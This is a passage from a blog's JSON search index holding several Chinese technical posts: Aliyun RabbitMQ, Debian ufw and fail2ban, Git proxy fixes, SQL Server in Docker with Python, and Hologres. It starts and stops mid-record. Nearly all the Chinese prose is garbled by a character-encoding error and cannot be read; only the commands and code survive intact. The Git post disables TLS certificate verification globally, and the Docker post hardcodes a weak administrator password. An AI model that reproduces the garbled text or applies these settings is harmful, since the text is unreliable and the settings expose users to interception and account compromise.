ç»å¯¹å€¼å¾—ä¸€è¯•ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"koa","slug":"koa","permalink":"https://banjinmei.github.io/tags/koa/"}],"author":"mu"},{"title":"aliyun RabbitMQ","slug":"aliyun-RabbitMQ","date":"2024-08-18T04:48:20.000Z","updated":"2024-08-18T10:01:34.000Z","comments":true,"path":"2024/08/18/aliyun-RabbitMQ/","permalink":"https://banjinmei.github.io/2024/08/18/aliyun-RabbitMQ/","excerpt":"","text":"äº‘æ¶ˆæ¯é˜Ÿåˆ—RabbitMQç‰ˆå’Œå¼€æºç‰ˆæœ¬çš„åŒºåˆ«å’Œä¼˜åŠ¿äº‘æ¶ˆæ¯é˜Ÿåˆ— RabbitMQ ç‰ˆæ˜¯ä¸€æ¬¾åŸºäºé«˜å¯ç”¨åˆ†å¸ƒå¼å­˜å‚¨æ¶æ„å®ç°çš„ AMQP 0-9-1 åè®®çš„æ¶ˆæ¯äº§å“ï¼Œèƒ½å¤Ÿå…¼å®¹å¼€æº RabbitMQ å®¢æˆ·ç«¯ã€‚ä¸å¼€æº RabbitMQ ç›¸æ¯”ï¼Œèƒ½å¤Ÿè§£å†³å„ç§ç¨³å®šæ€§ç—›ç‚¹ï¼ˆä¾‹å¦‚æ¶ˆæ¯å †ç§¯ã€è„‘è£‚ç­‰é—®é¢˜ï¼‰ï¼ŒåŒæ—¶å…·å¤‡é«˜å¹¶å‘ã€åˆ†å¸ƒå¼ã€çµæ´»æ‰©ç¼©å®¹ç­‰äº‘æ¶ˆæ¯æœåŠ¡ä¼˜åŠ¿ã€‚ äº‘æ¶ˆæ¯é˜Ÿåˆ—RabbitMQç‰ˆServerlessç³»åˆ—å®ä¾‹äº‘æ¶ˆæ¯é˜Ÿåˆ— RabbitMQ ç‰ˆ Serverless ç³»åˆ—å®ä¾‹èƒ½åŠ›å’Œé¢„ä»˜è´¹ç³»åˆ—çš„ä¼ä¸šç‰ˆèƒ½åŠ›ä¸€æ ·ï¼Œä½† Serverless ç³»åˆ—å®ä¾‹å…·æœ‰æ›´é«˜çš„å¼¹æ€§ä¸Šé™ï¼Œä¸”æ˜¯æŒ‰é‡åä»˜è´¹çš„è®¡è´¹æ–¹å¼ï¼Œæ— éœ€æå‰é¢„ç•™èµ„æºï¼ŒæŒ‰ç…§å®é™…ä½¿ç”¨é‡æ”¶è´¹ï¼Œé™æœ¬å¢æ•ˆã€‚ AccessKey AccessKeyæ·»åŠ  Vhostæ·»åŠ  Exchangeæ·»åŠ  Queue Exchangeç»‘å®šqueue å¯¼å…¥é¡¹ç›®åˆ°ideaIUamqp-java-demo &gt; src &gt; main &gt; javaï¼ŒåŒå‡»Config.javaæ–‡ä»¶ï¼Œå°†ä»£ç ä¸­HOSTNAMEã€USERNAMEã€PASSWORDä¸‰ä¸ªå‚æ•°å€¼æ›¿æ¢ä¸ºé˜¿é‡Œäº‘RabbitMQå®ä¾‹çš„å…¬ç½‘æ¥å…¥ç‚¹ã€é™æ€ç”¨æˆ·åå’Œé™æ€å¯†ç ã€‚ ProducerTest.javaæŒç»­å‘é€æ¶ˆæ¯ã€‚çœ‹åˆ°æ§åˆ¶å°[SendResult] Message with msgId: ba42ffcb-ff05-422e-9e9f-37cdd8f2c9b0 has been ack-ed, deliveryTag: 1, multiple: false ConsumerTest.javaæŒç»­æ¥æ”¶æ¶ˆæ¯ã€‚ è§‚å¯ŸIntelliJ IDEAæ§åˆ¶å°æ‰“å°çš„æ¶ˆæ¯æ”¶å‘è®°å½•ã€‚[ReceiveResult] Message Received successfully, messageId: fad269f2-a09d-441b-b74c-426c15fbbb17, consumerTag: yunQi-consumerTag, message: æ¶ˆæ¯Body-29 æŸ¥çœ‹Dashboardçš„å®ä¾‹æŒ‡æ ‡å˜åŒ–å¯ä»¥æŸ¥çœ‹æŒ‡å®šQueueçš„è¯¦ç»†æŒ‡æ ‡å˜åŒ–è¶‹åŠ¿ï¼Œç”¨äºå®šä½é—®é¢˜ã€‚ æ¶ˆæ¯è½¨è¿¹è½¨è¿¹è¯¦æƒ…ï¼ŒæŸ¥è¯¢å¯¹åº”æ¶ˆæ¯çš„ç”Ÿäº§å’ŒæŠ•é€’è½¨è¿¹è¯¦æƒ…ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://banjinmei.github.io/tags/rabbitmq/"}],"author":"mu"},{"title":"debian ufw","slug":"debian-ufw","date":"2024-08-18T04:44:31.000Z","updated":"2024-12-02T17:19:38.063Z","comments":true,"path":"2024/08/18/debian-ufw/","permalink":"https://banjinmei.github.io/2024/08/18/debian-ufw/","excerpt":"","text":"å®‰è£…ufw12sudo apt updatesudo apt install ufw #å¼€å¯é˜²ç«å¢™ 1sudo ufw enable #å…³é—­é˜²ç«å¢™ 123456789101112131415ufw disableufw status verboseufw status numberedsudo ufw status #æŸ¥çœ‹çŠ¶æ€sudo ufw disable #å…³é—­sudo ufw enble #å¼€å¯sudo ufw allow 8000/tcp #æ·»åŠ è§„åˆ™ï¼Œå…è®¸æ‰€æœ‰ipè®¿é—®8000ç«¯å£sudo ufw deny 8000/tcp #æ·»åŠ æˆ–è€…ä¿®æ”¹è§„åˆ™ï¼Œç¦æ­¢è®¿é—®8000ç«¯å£sudo ufw delete 8000/tcp #åˆ é™¤è¯¥è§„åˆ™ æ¢å¤é»˜è®¤ç­–ç•¥ï¼š123ufw default deny incoming ufw default allow outgoing ufw default reject routed é‡ç½®UFWï¼ˆå°†åˆ é™¤æ‰€æœ‰è‡ªå®šä¹‰ç­–ç•¥å¹¶å…³é—­UFWï¼‰ 1ufw reset æ·»åŠ å…è®¸è¿æ¥çš„å•†ç«¯å£ï¼š 1ufw allow [port] æ”¾è¡ŒæŒ‡å®šèŒƒå›´çš„ç«¯å£ï¼š 12ufw allow 10010:10086/tcpufw allow 10010:10086/udp å…è®¸æŒ‡å®šipè®¿é—® 1234567# æ”¾è¡Œipufw allow 221.123.1.1ufw allow 221.123.1.1 to any port 22# æ”¾è¡Œipæ®µufw allow 221.123.1.0/24ufw allow 221.123.1.0/24 to any port 22 æ‹’ç»è¿æ¥ 12ufw deny httpufw deny from 221.123.1.1 åˆ é™¤è§„åˆ™ 1234567# æŒ‰ç¼–å·åˆ é™¤ufw delete [num]# æŒ‰å®é™…è§„åˆ™åˆ é™¤ufw delete allow http # or ufw delete allow 80 fail2banåœ¨ Debian ç³»ç»Ÿä¸Šï¼Œå¯ä»¥é€šè¿‡é…ç½® fail2ban æ¥å®ç°ç›‘æ§ SSH ç™»å½•ï¼ˆé»˜è®¤ç«¯å£ä¸º 22ï¼‰ï¼Œå¹¶åœ¨å¯†ç è¾“é”™5æ¬¡æ—¶å°ç¦å¯¹åº”çš„ IPã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†æ­¥éª¤ï¼š 1. å®‰è£… fail2ban12sudo apt updatesudo apt install fail2ban -y 2. é…ç½® fail2banåˆ›å»ºè‡ªå®šä¹‰é…ç½®æ–‡ä»¶é»˜è®¤é…ç½®æ–‡ä»¶ä½äº &#x2F;etc&#x2F;fail2ban&#x2F;jail.confï¼Œä½†æˆ‘ä»¬ä¸ç›´æ¥ä¿®æ”¹å®ƒï¼Œè€Œæ˜¯åˆ›å»ºä¸€ä¸ªè¦†ç›–é…ç½®æ–‡ä»¶ï¼š 1sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local ç¼–è¾‘ jail.localä½¿ç”¨å–œæ¬¢çš„æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶ï¼š 1sudo nano /etc/fail2ban/jail.local æ‰¾åˆ° [sshd] éƒ¨åˆ†ï¼ˆå¦‚æœæ²¡æœ‰ï¼Œæ·»åŠ ï¼‰ï¼Œå¹¶ä¿®æ”¹å¦‚ä¸‹ï¼š 12345678[sshd]enabled = true # å¯ç”¨æ­¤è§„åˆ™port = 22 # ç›‘æ§ç«¯å£filter = sshd # ä½¿ç”¨é»˜è®¤ sshd è¿‡æ»¤è§„åˆ™logpath = /var/log/auth.log # SSH ç™»å½•çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼ˆDebian é»˜è®¤ï¼‰bantime = 3600 # å°ç¦æ—¶é—´ï¼Œå•ä½ä¸ºç§’ï¼ˆæ­¤å¤„ä¸º 1 å°æ—¶ï¼‰findtime = 600 # è®¡æ•°æ—¶é—´çª—å£ï¼Œå•ä½ä¸ºç§’ï¼ˆæ­¤å¤„ä¸º 10 åˆ†é’Ÿï¼‰maxretry = 5 # æœ€å¤§é‡è¯•æ¬¡æ•° 3. æ£€æŸ¥ fail2ban é…ç½®ç¡®ä¿ fail2ban é…ç½®è¯­æ³•æ­£ç¡®ï¼š 1sudo fail2ban-client -t å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œä¼šæ˜¾ç¤ºç±»ä¼¼ OK çš„è¾“å‡ºã€‚ 4. å¯åŠ¨å¹¶å¯ç”¨ fail2ban12sudo systemctl start fail2bansudo systemctl enable fail2ban 5. éªŒè¯è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆæ£€æŸ¥è¿è¡ŒçŠ¶æ€ 1sudo fail2ban-client status è¾“å‡ºä¸­åº”åŒ…æ‹¬ sshd ç›‘æ§è§„åˆ™ã€‚ æŸ¥çœ‹è¢«å°ç¦çš„ IPå¦‚æœè§¦å‘äº†è§„åˆ™ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰è¢«å°ç¦çš„ IPï¼š 1sudo fail2ban-client status sshd æ‰‹åŠ¨æµ‹è¯•ä»å¦ä¸€ä¸ªè®¾å¤‡æˆ–ç»ˆç«¯å°è¯•å¤šæ¬¡è¾“å…¥é”™è¯¯çš„ SSH å¯†ç ã€‚è§‚å¯Ÿ IP æ˜¯å¦è¢«å°ç¦ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è§£å°è¢«å°ç¦çš„ IPï¼š 1sudo fail2ban-client unban IP_ADDRESS 6. å¯é€‰ä¼˜åŒ–ä¿®æ”¹é»˜è®¤å°ç¦åŠ¨ä½œfail2ban é»˜è®¤å°ç¦ IP æ˜¯é€šè¿‡ä¿®æ”¹ iptables è§„åˆ™å®ç°çš„ã€‚å¦‚æœéœ€è¦ä½¿ç”¨å…¶ä»–å°ç¦æœºåˆ¶ï¼Œå¯ä»¥ä¿®æ”¹ [sshd] éƒ¨åˆ†çš„ action å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå‘é€é‚®ä»¶é€šçŸ¥ç­‰ã€‚ é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œçš„ Debian ç³»ç»Ÿä¼šç›‘æ§ 22 ç«¯å£ç™»å½•å°è¯•ï¼Œå¹¶åœ¨å¯†ç é”™è¯¯è¶…è¿‡ 5 æ¬¡æ—¶è‡ªåŠ¨å°ç¦ IPã€‚ 1bantime = -1 # è®¾ç½®æ°¸ä¹…å°ç¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"git 443 couldt connect","slug":"git-443-couldt-connect","date":"2024-08-18T03:59:27.000Z","updated":"2025-01-21T03:37:09.195Z","comments":true,"path":"2024/08/18/git-443-couldt-connect/","permalink":"https://banjinmei.github.io/2024/08/18/git-443-couldt-connect/","excerpt":"","text":"Git Err unable to access â€˜https://github.com/â€¦â€™: Failed to connect to github.com port 443 after 21096 ms: Couldnâ€™t connect to server err OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443 é‡ç½®gitä»£ç†æ£€æŸ¥æ˜¯å¦å¼€äº†ç½‘ç»œä»£ç†ï¼Œå¦‚æœæœ‰å…ˆå…³é—­åœ¨å‘½ä»¤è¡Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ 1234git config --global --unset http.proxygit config --global --unset https.proxy æ‰¾åˆ°æœ¬æœºä»£ç†ç«¯å£å· 123git config --global http.proxy http://127.0.0.1:ç«¯å£å·git config --global https.proxy http://127.0.0.1:ç«¯å£å· git config â€“global http.sslVerify false ç½‘ç»œä¸internet -&gt; ä»£ç† æ‰‹åŠ¨è®¾ç½®ä»£ç†IP ç«¯å£10809 git HTTPä»£ç†è®¾ç½®è¦è®¾ç½®Gitçš„HTTPä»£ç†ï¼Œéœ€è¦åœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š git config â€“global http.proxy ä»£ç†åœ°å€:ç«¯å£å· ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ­£åœ¨ä½¿ç”¨127.0.0.1çš„ä»£ç†æœåŠ¡å™¨å’Œ8888çš„ç«¯å£ï¼Œé‚£ä¹ˆæ‚¨éœ€è¦è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š git config â€“global http.proxy 127.0.0.1:8888 å¦‚æœæ‚¨æƒ³åœ¨Gitä¸Šä½¿ç”¨çš„ä»£ç†éœ€è¦èº«ä»½éªŒè¯ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥é…ç½®HTTPä»£ç†ï¼š git config â€“global http.proxy ç”¨æˆ·å:å¯†ç @ä»£ç†åœ°å€:ç«¯å£å· HTTPSä»£ç†è®¾ç½®å¦‚æœæ‚¨æƒ³è®¾ç½®HTTPSä»£ç†ï¼Œéœ€è¦åœ¨ç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š git config â€“global https.proxy ä»£ç†åœ°å€:ç«¯å£å· ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ­£åœ¨ä½¿ç”¨127.0.0.1ä»£ç†æœåŠ¡å™¨å’Œ8888ç«¯å£ï¼Œé‚£ä¹ˆæ‚¨éœ€è¦è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š git config â€“global https.proxy 127.0.0.1:8888 å¦‚æœæ‚¨çš„ä»£ç†éœ€è¦èº«ä»½éªŒè¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡ŒHTTPSä»£ç†è®¾ç½®ï¼š git config â€“global https.proxy ç”¨æˆ·å:å¯†ç @ä»£ç†åœ°å€:ç«¯å£å· å–æ¶ˆä»£ç†è®¾ç½®å¦‚æœæ‚¨æƒ³å–æ¶ˆç°æœ‰çš„ä»£ç†è®¾ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å–æ¶ˆHTTPä»£ç†çš„é…ç½®ï¼š git config â€“global â€“unset http.proxy å–æ¶ˆHTTPSä»£ç†çš„é…ç½®ï¼š git config â€“global â€“unset https.proxy æ£€æŸ¥å½“å‰ä»£ç†è®¾ç½®å¦‚æœæ‚¨æƒ³æ£€æŸ¥å½“å‰ä»£ç†é…ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹ï¼š git config â€“global â€“get http.proxygit config â€“global â€“get https.proxy","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"git","slug":"git","permalink":"https://banjinmei.github.io/tags/git/"}],"author":"mu"},{"title":"Docker mssql","slug":"Docker-mssql","date":"2024-08-18T03:08:56.000Z","updated":"2024-08-18T03:48:32.000Z","comments":true,"path":"2024/08/18/Docker-mssql/","permalink":"https://banjinmei.github.io/2024/08/18/Docker-mssql/","excerpt":"","text":"åˆ›å»ºå®¹å™¨1docker run -e &quot;ACCEPT_EULA=Y&quot; -e &quot;MSSQL_SA_PASSWORD=Admin@123&quot; -p 1433:1433 --name sql1 --hostname sql1 -d mcr.microsoft.com/mssql/server:2017-latest è¿›å…¥1234sudo docker exec -it sql1 &quot;bash&quot;/opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P &quot;Admin@123&quot; 123456789101112131415161718CREATE DATABASE TestDB;goSELECT Name from sys.databases;gouse TestDB;go;CREATE TABLE Employees ( EmployeeID INT PRIMARY KEY, FirstName NVARCHAR(50), LastName NVARCHAR(50), BirthDate DATE, Position NVARCHAR(50) );INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (1, &#x27;z&#x27;, &#x27;s&#x27;, &#x27;2000-01-01&#x27;, &#x27;Software Developer&#x27;);INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (2, &#x27;l&#x27;, &#x27;s&#x27;, &#x27;2001-01-15&#x27;, &#x27;Project Manager&#x27;);INSERT INTO Employees (FirstName, LastName, BirthDate, Position) VALUES ( &#x27;l1&#x27;, &#x27;s&#x27;, &#x27;2001-01-15&#x27;, &#x27;Project Manager&#x27;);SELECT * FROM Employees; pyæµ‹è¯•1pip install pyodbc 12345678910111213141516171819202122232425262728import pyodbc# é…ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯server = &#x27;localhost&#x27;database = &#x27;TestDB&#x27;username = &#x27;SA&#x27;password = &#x27;Admin@123&#x27;driver = &#x27;&#123;ODBC Driver 17 for SQL Server&#125;&#x27; # æ ¹æ®ä½ çš„SQL Serverç‰ˆæœ¬é€‰æ‹©åˆé€‚çš„é©±åŠ¨# å»ºç«‹è¿æ¥connection_string = f&quot;DRIVER=&#123;driver&#125;;SERVER=&#123;server&#125;;DATABASE=&#123;database&#125;;UID=&#123;username&#125;;PWD=&#123;password&#125;&quot;conn = pyodbc.connect(connection_string)cursor = conn.cursor()# æ‰§è¡ŒæŸ¥è¯¢query = &quot;SELECT * FROM Employees&quot;cursor.execute(query)rows = cursor.fetchall()# æ‰“å°ç»“æœfor row in rows: print(row)# å…³é—­è¿æ¥cursor.close()conn.close() 1python mssql.py (1, â€˜zâ€™, â€˜sâ€™, datetime.date(2000, 1, 1), â€˜Software Developerâ€™)(2, â€˜lâ€™, â€˜sâ€™, datetime.date(2001, 1, 15), â€˜Project Managerâ€™) backup12345678USE master;goBACKUP DATABASE [TestDB]TO DISK = &#x27;C:\\path\\YourDatabaseName.bak&#x27; WITH FORMAT; restore1234567USE master; GO ALTER DATABASE [TestDB] SET SINGLE_USER WITH ROLLBACK IMMEDIATE;RESTORE DATABASE [TestDB] FROM DISK = &#x27;C:\\path\\YourDatabaseName.bak&#x27; WITH REPLACE;ALTER DATABASE [TestDB] SET MULTI_USER; 1docker stop sql1 åœæ­¢","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"mssql","slug":"mssql","permalink":"https://banjinmei.github.io/tags/mssql/"},{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"}],"author":"mu"},{"title":"Hologres DataWorks","slug":"Hologres-DataWorks","date":"2024-08-15T14:49:43.000Z","updated":"2024-08-15T15:14:58.000Z","comments":true,"path":"2024/08/15/Hologres-DataWorks/","permalink":"https://banjinmei.github.io/2024/08/15/Hologres-DataWorks/","excerpt":"","text":"å®æ—¶æ•°ä»“HologresHologresæ˜¯é˜¿é‡Œäº‘è‡ªç ”ä¸€ç«™å¼å®æ—¶æ•°ä»“ï¼Œç»Ÿä¸€æ•°æ®å¹³å°æ¶æ„ï¼Œæ”¯æŒæµ·é‡ç»“æ„åŒ–&#x2F;åŠç»“æ„åŒ–æ•°æ®çš„å®æ—¶å†™å…¥ã€å®æ—¶æ›´æ–°ã€å®æ—¶åŠ å·¥ã€å®æ—¶åˆ†æï¼Œæ”¯æŒæ ‡å‡†SQLï¼ˆå…¼å®¹PostgreSQLåè®®ï¼‰ï¼Œæ— ç¼å¯¹æ¥ä¸»æµBIå·¥å…·ï¼Œæ”¯æŒOLAPæŸ¥è¯¢ã€å³å¸­åˆ†æã€åœ¨çº¿æœåŠ¡ã€å‘é‡è®¡ç®—å¤šä¸ªåœºæ™¯ï¼Œåˆ†ææ€§èƒ½æ‰“ç ´TPC-Hä¸–ç•Œè®°å½•ï¼Œä¸MaxComputeã€Flinkã€DataWorksæ·±åº¦èåˆï¼Œæä¾›ç¦»åœ¨çº¿ä¸€ä½“åŒ–å…¨æ ˆæ•°ä»“è§£å†³æ–¹æ¡ˆã€‚ å¤§æ•°æ®å¼€å‘æ²»ç†å¹³å°DataWorksDataWorksåŸºäºé˜¿é‡Œäº‘ODPS&#x2F;EMR&#x2F;CDPç­‰å¤§æ•°æ®å¼•æ“ï¼Œä¸ºæ•°æ®ä»“åº“&#x2F;æ•°æ®æ¹–&#x2F;æ¹–ä»“ä¸€ä½“ç­‰è§£å†³æ–¹æ¡ˆæä¾›ç»Ÿä¸€çš„å…¨é“¾è·¯å¤§æ•°æ®å¼€å‘æ²»ç†å¹³å°ã€‚ä½œä¸ºé˜¿é‡Œå·´å·´æ•°æ®ä¸­å°çš„å»ºè®¾è€…ï¼ŒDataWorksä»2009å¹´èµ·ä¸æ–­æ²‰æ·€é˜¿é‡Œå·´å·´å¤§æ•°æ®å»ºè®¾æ–¹æ³•è®ºï¼ŒåŒæ—¶ä¸æ•°ä¸‡åæ”¿åŠ¡&#x2F;é‡‘è&#x2F;é›¶å”®&#x2F;äº’è”ç½‘&#x2F;èƒ½æº&#x2F;åˆ¶é€ ç­‰å®¢æˆ·æºæ‰‹ï¼ŒåŠ©åŠ›äº§ä¸šæ•°å­—åŒ–å‡çº§ã€‚ DataVæ•°æ®å¯è§†åŒ–æ•°æ®å¯è§†åŒ–DataVæ˜¯é˜¿é‡Œäº‘æ•°æ®å¯è§†åŒ–åº”ç”¨æ­å»ºå¹³å°ï¼Œæ—¨è®©æ›´å¤šçš„äººçœ‹åˆ°æ•°æ®å¯è§†åŒ–çš„é­…åŠ›ï¼Œå¸®åŠ©éä¸“ä¸šçš„å·¥ç¨‹å¸ˆé€šè¿‡å›¾å½¢åŒ–çš„ç•Œé¢è½»æ¾æ­å»ºä¸“ä¸šæ°´å‡†çš„å¯è§†åŒ–åº”ç”¨ï¼Œæ»¡è¶³æ‚¨ä¼šè®®å±•è§ˆã€ä¸šåŠ¡ç›‘æ§ã€é£é™©é¢„è­¦ã€åœ°ç†ä¿¡æ¯åˆ†æç­‰å¤šç§ä¸šåŠ¡çš„å±•ç¤ºéœ€æ±‚ã€‚ Hologres 64core VS ClickHouse 64coreåœ¨å•è¡¨æµ‹è¯•çš„13ä¸ªæŸ¥è¯¢ä¸­ï¼Œ11ä¸ªæŸ¥è¯¢Hologresæ¯”Clickhouseæ›´å¿«ã€‚Clickhouseæ€»è€—æ—¶æ˜¯Hologresçš„1.35å€ã€‚ é«˜æ€§èƒ½å®æ—¶å†™å…¥ä¸æ›´æ–°é€šè¿‡Hologres Fixed Planèƒ½åŠ›ï¼Œå®ç°é«˜æ€§èƒ½çš„å®æ—¶å†™å…¥ä¸æ›´æ–° Hologres Binlog:å…¨é“¾è·¯çš„å®æ—¶å¼€å‘ä½“éªŒï¼Œç®€åŒ–æ•°ä»“åˆ†å±‚é€šè¿‡Hologres Binl0gï¼Œç»“åˆFlinkï¼Œå¯ä»¥å®ç°å…¨é“¾è·¯çš„å®æ—¶å¼€å‘ä½“éªŒï¼Œè¾¾åˆ°åƒKafkaã€datahubåŒç­‰çš„æ¶ˆæ¯é˜Ÿåˆ—èƒ½åŠ›ï¼Œç®€åŒ–æ•°ä»“åˆ†å±‚ä½“éªŒï¼Œå¢åŠ æ•°æ®å¤ç”¨èƒ½åŠ›ã€‚ Runtime Filter:è‡ªåŠ¨ä¼˜åŒ–å¤§å°è¡¨Joinæ•ˆç‡è®¡ç®—ç»„(warehouse)å®ä¾‹:èµ„æºéš”ç¦»ã€å¼¹æ€§ã€è‡ªåŠ¨åˆ‡æµ Serverless Computing:æä¾›å¤§ä½œä¸šéš”ç¦»ä¸å¼¹æ€§å¤„ç†é€šè¿‡å…±äº«Serverlessèµ„æºæ‰§è¡ŒDMLä»»åŠ¡ï¼Œä¿è¯å¤§ä»»åŠ¡éš”é«˜ä¸é«˜å¯ç”¨ï¼Œé™ä½æˆæœ¬å¹¶æå‡æ€§èƒ½ã€‚åŒæ—¶æ”¯æŒè®¾ç½®å•æ¡SOLä½¿ç”¨Serverlessçš„èµ„æºä¸Šé™ï¼Œæ”¯æŒè®¾ç½®ä½¿ç”¨Serverlessèµ„æºçš„SOLä¼˜å…ˆçº§ æ¡ˆä¾‹å°çº¢ä¹¦ ClickHouse Only 7å¤©ä¹å…ƒç´ :æ›¿æ¢Hive+Prestoæ„å»ºé«˜æ€§èƒ½æ¸¸æˆè¿è¥åˆ†æå¹³ç™½æµé‡åˆ†æ å¼€ç®±å¯ç”¨ æ€§èƒ½æ¯”æ‰‹å†™sqlå¿«10å€ èŠ‚çº¦æˆæœ¬https://www.aliyun.com/activity/bigdata/hologres_cases ç”µå•†æ¼æ–—æ¨¡å‹åˆ†ææ¼æ–—æ¨¡å‹æœ‰åŠ©äºä¼ä¸šè¯†åˆ«åœ¨å®¢æˆ·è´­ä¹°è¿‡ç¨‹ä¸­çš„å„ä¸ªç¯èŠ‚ï¼Œé€šè¿‡ä¼˜åŒ–æ¼æ–—çš„å„ä¸ªé˜¶æ®µæ¥å¢åŠ è½¬åŒ–ç‡ï¼Œæå‡é”€å”®ä¸šç»©ã€‚æœ¬æ¡ˆä¾‹å°†åˆ†æç”µå•†åœºæ™¯çš„æ¼æ–—æ¨¡å‹ã€è®¡ç®—å„ç¯èŠ‚çš„è½¬åŒ–ç‡ã€‚ æ™ºæ…§åŸå¸‚äººå£è´¢äº§ä¸»é¢˜åˆ†æé‡‡é›†å„ä¸ªé¢†åŸŸçš„æ•°æ®è¿›è¡Œæ•´åˆå’Œåˆ†æï¼Œä½¿å¾—åŸå¸‚ç®¡ç†æ›´é«˜æ•ˆã€æœåŠ¡æ›´è´´å¿ƒã€‚æœ¬æ¡ˆä¾‹ä»¥åŸå¸‚äººå£è´¢äº§ä¸»é¢˜åˆ†æä¸ºèƒŒæ™¯ï¼Œä¸ºæ‚¨ä»‹ç»DataWorksåœ¨æ™ºæ…§åŸå¸‚é¡¹ç›®ä¸­çš„åº”ç”¨ã€‚ è§†é¢‘ä¸ªæ€§åŒ–æ¨è(ååŒè¿‡æ»¤)ååŒè¿‡æ»¤ç®—æ³•æ˜¯ä¸€ç§ç”¨äºä¸ªæ€§åŒ–æ¨èçš„æŠ€æœ¯ï¼Œå®ƒå¯ä»¥åŸºäºç”¨æˆ·é—´çš„è¡Œä¸ºç›¸ä¼¼æ€§æˆ–ç‰©å“é—´çš„ç›¸ä¼¼æ€§ä¸ºç”¨æˆ·æ¨èç‰©å“ã€‚æœ¬æ¡ˆä¾‹å°†ä¸ºæ‚¨ä»‹ç»åœ¨DataWorksä¸­å¦‚ä½•ä½¿ç”¨é˜¿é‡Œäº‘PAIçš„ååŒè¿‡æ»¤ç®—æ³•å®ç°è§†é¢‘çš„ä¸ªæ€§åŒ–æ¨èã€‚ å®æ“mysql -&gt; hologresåˆ›å»ºä¸“æœ‰ç½‘ç»œVPCå’Œäº¤æ¢æœº192.168.0.0&#x2F;16ã€‚å¼€é€šDataWorksåˆ›å»ºå…¬ç½‘NAT åˆ›å»ºHologresè¡¨ç™»å½•Hologresæ§åˆ¶å°ã€‚æ–°å»ºåº“ï¼Œæ–°å»ºè¡¨ 12345678910111213141516171819202122232425262728293031323334353637383940-- æ–°å»ºschemaç”¨äºåˆ›å»ºå†…è¡¨å¹¶å¯¼å…¥æ•°æ®CREATE SCHEMA IF NOT EXISTS hologres_dataset_github_event;DROP TABLE IF EXISTS hologres_dataset_github_event.hologres_github_event;BEGIN;CREATE TABLE hologres_dataset_github_event.hologres_github_event ( id bigint PRIMARY KEY, actor_id bigint, actor_login text, repo_id bigint, repo_name text, org_id bigint, org_login text, type text, created_at timestamp with time zone NOT NULL, action text, commit_id text, member_id bigint, language text);CALL set_table_property (&#x27;hologres_dataset_github_event.hologres_github_event&#x27;, &#x27;distribution_key&#x27;, &#x27;id&#x27;);CALL set_table_property (&#x27;hologres_dataset_github_event.hologres_github_event&#x27;, &#x27;event_time_column&#x27;, &#x27;created_at&#x27;);CALL set_table_property (&#x27;hologres_dataset_github_event.hologres_github_event&#x27;, &#x27;clustering_key&#x27;, &#x27;created_at&#x27;);COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.id IS &#x27;äº‹ä»¶ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.actor_id IS &#x27;äº‹ä»¶å‘èµ·â¼ˆID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.actor_login IS &#x27;äº‹ä»¶å‘èµ·â¼ˆç™»å½•å&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.repo_id IS &#x27;repoID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.repo_name IS &#x27;repoåç§°&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.org_id IS &#x27;repoæ‰€å±ç»„ç»‡ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.org_login IS 